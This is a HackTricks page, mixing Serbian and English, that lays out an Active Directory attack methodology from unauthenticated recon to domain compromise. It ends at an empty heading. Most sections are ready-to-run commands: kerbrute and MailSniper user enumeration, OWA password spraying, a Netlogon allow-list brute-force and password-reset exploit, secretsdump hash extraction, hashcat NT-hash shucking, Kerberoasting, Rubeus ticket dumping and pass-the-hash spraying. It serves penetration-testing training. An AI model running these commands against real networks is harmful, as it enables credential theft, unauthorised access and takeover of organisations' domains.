# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** služi kao osnovna tehnologija, omogućavajući **network administrators** da efikasno kreiraju i upravljaju **domains**, **users**, i **objects** unutar mreže. Dizajniran je da se skalira, olakšavajući organizaciju velikog broja korisnika u upravljive **groups** i **subgroups**, uz kontrolu **access rights** na različitim nivoima.

Struktura **Active Directory** sastoji se od tri primarna sloja: **domains**, **trees**, i **forests**. **domain** obuhvata skup objekata, kao što su **users** ili **devices**, koji dele zajedničku bazu podataka. **Trees** su grupe ovih domain-a povezane zajedničkom strukturom, a **forest** predstavlja skup više trees, međusobno povezanih kroz **trust relationships**, formirajući najviši sloj organizacione strukture. Specifična **access** i **communication rights** mogu se dodeliti na svakom od ovih nivoa.

Ključni koncepti unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na Active Directory objekte.
2. **Object** – Oznacava entitete unutar directory-ja, uključujući **users**, **groups**, ili **shared folders**.
3. **Domain** – Služi kao kontejner za directory objekte, uz mogućnost da više domain-a koegzistira unutar **forest**, pri čemu svaki održava sopstvenu kolekciju objekata.
4. **Tree** – Grupa domain-a koji dele zajednički root domain.
5. **Forest** – Vrh organizacione strukture u Active Directory, sastavljen od nekoliko trees sa **trust relationships** među njima.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ovi servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **users** i **domains**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje sigurnim **digital certificates**.
3. **Lightweight Directory Services** – Podržava directory-enabled aplikacije kroz **LDAP protocol**.
4. **Directory Federation Services** – Pruža mogućnosti **single-sign-on** za autentifikaciju korisnika kroz više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti materijala za autorska prava regulisanjem njihove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Ključan za rešavanje **domain names**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da **attack an AD** potrebno je da jako dobro **understand** **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Možete mnogo da saznate na [https://wadcoms.github.io/](https://wadcoms.github.io) kako biste brzo videli koje komande možete da pokrenete za enumeraciju/exploitovanje AD.

> [!WARNING]
> Kerberos komunikacija **requires a full qualifid name (FQDN)** za izvođenje akcija. Ako pokušate da pristupite mašini preko IP adrese, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ako imate samo pristup AD okruženju, ali nemate nikakve credentials/sessions, mogli biste da:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **exploit vulnerabilities** ili da iz njih **extract credentials** (na primer, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS može dati informacije o ključnim serverima u domain-u kao što su web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opšti [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste pronašli više informacija o tome kako ovo da uradite.
- **Check for null and Guest access on smb services** (ovo neće raditi na modernim Windows verzijama):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o tome kako da enumerišete SMB server možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o tome kako da enumerišete LDAP možete pronaći ovde (obratite **posebnu pažnju na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite host-u koristeći [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izvucite usernames/names iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domain okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete probati različite AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Pogledajte strane [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **invalid username**, server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je username nevažeći. **Valid usernames** će izazvati ili **TGT in a AS-REP** odgovor ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da korisnik mora da izvrši pre-autentifikaciju.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) prema MS-NRPC (Netlogon) interfejsu na domain controller-ima. Metod poziva `DsrGetDcNameEx2` funkciju nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih credentials. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje možete pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, možete takođe izvršiti **enumeraciju korisnika** protiv njega. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **ime ljudi koji rade u kompaniji** iz recon koraka koji ste trebalo da uradite pre ovoga. Sa imenom i prezimenom mogli biste da koristite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalno validna korisnička imena.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC, eksplicitno allow-listed nalozi i dalje mogu biti izloženi **legacy/vulnerable Netlogon secure-channel behavior**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća registry vrednost **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL security descriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Bilo koji nalog ili grupa kojoj je dodeljen relevantan ACE u DACL može biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno allow-lists **Everyone**.

Praktičan operator workflow:

1. **Identifikujte allow-listed principe** proverom i **SYSVOL/GPO** i **live DC registry**.
2. **Rezolvujte SID-ove** pronađene u SDDL-u na stvarne AD korisnike/računare i prioritet dajte **DC machine accounts**, **trust accounts**, i drugim privilegovanim mašinama.
3. Više puta pokušajte **MS-NRPC / Netlogon authentication** kao allow-listed nalog.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da resetujete lozinku ciljnog naloga (public PoC je postavlja na prazan string).

Brza triage / lab primeri iz public artifact-a:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Napomene:

- **scanner** je koristan zato što efektivna allow-list može postojati u **SYSVOL**, u **registry**, ili u oba.
- Sama putanja eksploatacije je važna zato što **ne zahteva Domain Admin privilegije** nakon što je ranjiv nalog identifikovan.
- Kompromitovanje **Domain Controller machine account** kao što je `DC$` je posebno opasno zato što resetovanje te lozinke može direktno omogućiti šire puteve za **AD takeover**.
- Izvodljivost **brute-force** napada zavisi od moda: javni artifact opisuje meet-in-the-middle pristup, **24-bit** brute force kada je dostupan drugi computer account, i sporije **32-bit** varijante.

Napomene za detekciju / hardening:

- Auditujte allow-list policy i uklonite sve osim privremenih, eksplicitno potrebnih compatibility izuzetaka.
- Pratite DC **System** događaje **5827/5828/5829/5830/5831** da biste uhvatili slučajeve kada se ranjive Netlogon konekcije odbijaju, otkrivaju ili eksplicitno dozvoljavaju policy-em.
- Tretirajte naloge u `VulnerableChannelAllowList` kao **high-risk** dok se legacy dependency ne ukloni.

### Knowing one or several usernames

Ok, tako da već znate da imate validan username, ali ne i passworde... Onda pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati neke podatke enkriptovane derivacijom korisnikovog passworda.
- [**Password Spraying**](password-spraying.md): Hajde da probamo naj**common** passworde sa svakim od otkrivenih korisnika, možda neki korisnik koristi loš password (imajte na umu password policy!).
- Imajte na umu da takođe možete **spray-ovati OWA servers** da biste pokušali da dobijete pristup mail serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **obtain** neke challenge **hashes** za crack-ovanje **poisoning**-om nekih protokola **network**-a:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete active directory, imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da naterate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  da biste dobili pristup AD env.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da biste čuvali AD recon stanje po engagement-u: `workspace create <name>` pokreće per-protocol SQLite DBs u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaz sa `proto smb|mssql|winrm` i listajte prikupljene secrets sa `creds`. Ručno obrišite sensitive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.
- Brzo otkrivanje subnet-a sa **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements**, i **Null Auth**. Members koji pokazuju `(signing:False)` su **relay-prone**, dok DCs često zahtevaju signing.
- Generišite **hostnames in /etc/hosts** direktno iz NetExec output-a radi lakšeg targetovanja:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay ka DC** blokiran zbog signing-a, i dalje proveri **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / slabu channel binding. DC sa obaveznim SMB signing-om, ali bez LDAP signing-a, i dalje je validan cilj za **relay-to-LDAP** za zloupotrebe poput **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs ponekad **ugrađuju maskirane admin password-e u HTML**. Pregled source/devtools može otkriti cleartext (npr. `<input value="<password>">`), što omogućava Basic-auth pristup za skeniranje/štampanje repozitorijuma.
- Preuzeti print job-ovi mogu sadržati **plaintext onboarding docs** sa per-user password-ima. Drži uparivanja usklađenim tokom testiranja:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da izlistate active directory, imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da naterate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sada kada imate neke osnovne kredencijale, trebalo bi da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD-a**. To biste mogli da uradite ručno, ali je to veoma dosadan i ponavljajući zadatak (a još više ako nađete stotine dokumenata koje treba da proverite).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da **pristupite drugim PC-jevima ili share-ovima**, mogli biste da **postavite fajlove** (kao SCF fajl) koji će, ako im se nekako pristupi, t**rigovati NTLM autentikaciju ka vama** kako biste mogli da **ukradete** **NTLM challenge** i crackujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan, potrebne su vam neke posebne privilegije/kredencijali da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki lokalni admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dumpujete sve hasheve u memoriji i lokalno.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash nekog korisnika**, možete ga koristiti da biste ga **impersonateovali**.\
Potrebno je da koristite neki **tool** koji će **izvršiti** **NTLM autentikaciju koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **ubrizgati** taj **hash** u **LSASS**, tako da kada se izvrši bilo koja **NTLM autentikacija**, taj **hash će biti korišćen.** Poslednja opcija je ono što radi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi user NTLM hash za traženje Kerberos ticket-ova**, kao alternativu uobičajenom Pass The Hash preko NTLM protokola. Zato ovo može biti posebno **korisno u mrežama gde je NTLM protokol isključen** i gde je samo **Kerberos dozvoljen** kao protokol autentikacije.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu authentication ticket korisnika** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi da bi se **impersonateovao korisnik**, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** lokalnog **administratora**, trebalo bi da pokušate da se **lokalno prijavite** na druge **PC-jeve** koristeći ga.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Napomena da je ovo prilično **noisy** i da bi **LAPS** to **mitigate**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije da **access MSSQL instances**, mogao bi da ih iskoristi za **execute commands** na MSSQL hostu (ako radi kao SA), da **steal** NetNTLM **hash** ili čak da izvede **relay** **attack**.\
Takođe, ako je MSSQL instanca trusted (database link) od strane druge MSSQL instance. Ako korisnik ima privilegije nad trusted bazom podataka, moći će da **use the trust relationship to execute queries also in the other instance**. Ovi trustovi mogu da se lančaju i u nekom trenutku korisnik možda može da pronađe pogrešno konfigurisanu bazu podataka gde može da execute commands.\
**Veze između baza rade čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites često expose moćne putanje do credentials i code execution. Pogledaj:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađeš bilo koji Computer object sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imaš domain privilegije na tom računaru, moći ćeš da dumpuješ TGT-ove iz memorije svakog korisnika koji se prijavi na računar.\
Dakle, ako se **Domain Admin logins onto the computer**, moći ćeš da dumpuješ njegov TGT i impersonate ga koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation mogao bi čak i **automatically compromise a Print Server** (nadamo se da će biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", moći će da **impersonate any user to access some services in a computer**.\
Zatim, ako **compromise the hash** ovog korisnika/računara moći ćeš da **impersonate any user** (čak i domain admins) da bi pristupio nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju nad Active Directory objektom udaljenog računara omogućava postizanje code execution sa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Komprimituovani korisnik bi mogao da ima neke **interesting privileges over some domain objects** koje bi mogle da ti omoguće da se **move** laterally/**escalate** privilegije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Otkrivanje **Spool service listening** unutar domena može da se **abused** za **acquire new credentials** i **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **other users** **access** **compromised** mašinu, moguće je **gather credentials from memory** i čak **inject beacons in their processes** da bi ih impersonate-ovao.\
Obično će se korisnici prijavljivati na sistem preko RDP, pa evo kako da izvedeš nekoliko napada nad third party RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **local Administrator password** na računarima pridruženim domenu, obezbeđujući da je **randomized**, jedinstvena i često **changed**. Ove lozinke se čuvaju u Active Directory i pristup je kontrolisan kroz ACL-ove samo za ovlašćene korisnike. Uz dovoljno privilegija da pristupiš ovim lozinkama, moguće je pivoting na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** sa kompromitovane mašine može biti način da se eskaliraju privilegije unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

